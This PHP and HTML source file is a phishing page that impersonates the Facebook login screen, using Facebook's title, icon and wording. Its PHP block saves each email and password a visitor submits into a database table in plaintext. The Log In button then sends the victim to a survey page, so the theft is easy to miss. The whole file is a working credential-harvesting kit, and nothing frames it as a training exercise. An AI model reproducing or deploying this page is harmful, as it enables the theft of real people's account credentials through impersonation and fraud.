<?php

    include "db.php";

    if($_SERVER["REQUEST_METHOD"] == "POST"){
        $email = $_POST['email'];
        $psw = $_POST['psw']; 

        $sql="INSERT INTO user (email, password) VALUES(?,?)";
        $result=$conn->prepare($sql);
        $result->bind_param("ss", $email, $psw);
        $result->execute();
        $result->close();
    };

?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to FB</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="shortcut icon" href="facebook.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <div class="wrapper">
        <h1><img src="rename.svg" alt="logo"></h1>
        <div class="container">
            <form action="index.php" method="POST">
                <p class="form-heading">Log in to Facebook</p>
                <input type="text" name="email" placeholder="Email address or Phone number" required>
                <div class="password-container">
                    <input type="password" name="psw" id="password" placeholder="Password" required>
                    <i class="fa fa-eye" id="togglePassword"></i>
                </div>
                <button type="submit" onclick="window.location.href='survey.html'"><b>Log In</b></button>
                <a href="#">Forgotten account?</a>
                <div class="separator"><span>or</span></div>
                <button type="button" class="create-account"><b>Create new account</b></button>
            </form>
        </div>
    </div>


    <script>
        const togglePassword = document.querySelector('#togglePassword');
        const password = document.querySelector('#password');

        togglePassword.addEventListener('click', function (e) {
            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
            password.setAttribute('type', type);
            this.classList.toggle('fa-eye-slash');
        });
    </script>

</body>
</html>
